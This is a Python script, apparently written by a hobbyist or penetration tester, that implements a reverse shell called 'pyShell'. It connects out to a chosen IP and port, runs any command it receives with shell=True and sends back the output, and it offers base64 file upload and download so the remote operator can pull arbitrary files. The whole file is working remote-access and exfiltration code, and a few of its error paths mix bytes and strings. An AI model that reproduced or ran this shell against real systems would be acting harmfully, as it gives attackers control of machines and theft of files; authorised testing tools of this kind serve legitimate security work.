#!/usr/bin/env python3
# Author: Mark Kaiser (c0braKai)
# Date: 08/25/2019
# Description: A basic python shell with upload/download functionality.

import socket, time, subprocess, codecs, argparse

def upload(mysocket):
    mysocket.send(b"What is the name of the file you want to upload?:")
    filename = mysocket.recv(1024).decode()
    mysocket.send(b"What unique string will terminate the transmission?:")
    endoffile = mysocket.recv(1024)
    mysocket.send(b"Transmit the file in a base64 encoded string followed by the termination string.\n")
    data = b""
    while not data.endswith(endoffile):
        data += mysocket.recv(1024)
    try:
        fh = open(filename.strip(), "w")
        fh.write(codecs.decode(data[:-len(endoffile)], "base64").decode("latin-1"))
        fh.close()
    except Exception as e:
        mysocket.send("Unable to create file {0}. {1}".format(filename, str(e)).encode())
    else:
        mysocket.send(filename + b" successfully uploaded")

def download(mysocket):
    mysocket.send(b"What file do you want (including path)?:")
    filename = mysocket.recv(1024).decode()
    mysocket.send(b"Receive a base64 encoded string containing your file will end with !EOF!\n")
    try:
        data = codecs.encode(open(filename.strip(),"rb").read(), "base64")
    except:
        data = "File " + filename + " not found"
    mysocket.sendall(data + "!EOF!".encode())

def connect(mySocket, ip, port):
    print("Initiating Connection")
    connected = False
    while not connected:
            try:
                print("Trying", port, end=" ")
                mySocket.connect((ip, int(port)))
            except socket.error:
                print("Connectivity issues")
                exit
            else:
                print("Successful Connection")
                connected = True
                break

def main():
    # build help menu and arguments
    parser = argparse.ArgumentParser(
        description='Send a reverse shell. Use DOWNLOAD to initiate a download. Use UPLOAD to initiate an upload.'
                    ' Use QUIT to tear down the shell.'
                    '\nUSAGE: ./pyShell -t 127.0.0.1 -p 443')
    parser.add_argument('-t', default='127.0.0.1', dest='ip', help='provide ip to send a shell to, example: 127.0.0.1')
    parser.add_argument('-p', default='80', dest='port', help='declares which port to connect to.')
    parser.add_argument('-v', dest='version', required=False, action="store_true", help='Display the version number')
    args = parser.parse_args()
    mySocket = socket.socket()

    if not args.ip and not args.version:
        print(parser.description)
    # prints version
    if args.version:
        print("pyShell version 0.2")
        exit()
    if args.ip and args.port:
        connect(mySocket, args.ip, args.port)
        while True:
            try:
                commandRequested = mySocket.recv(1024).decode()
                if len(commandRequested) == 0:
                    time.sleep(3)
                    mySocket = socket.socket()
                    connect(mySocket, args.ip, args.port)
                    continue
                if commandRequested[:4] == "QUIT":
                    mySocket.send(b"Terminating Connection.\n")
                    break
                if commandRequested[:6] == "UPLOAD":
                    upload(mySocket)
                    continue
                if commandRequested[:8] == "DOWNLOAD":
                    download(mySocket)
                    continue
                prochandle = subprocess.Popen(
                    commandRequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                results, errors = prochandle.communicate()
                results = results + errors
                mySocket.send(results)
            except socket.error:
                break
            except Exception as e:
                mySocket.send(bytes(str(e), "utf-8"))
                break

if __name__ == '__main__':
    main()
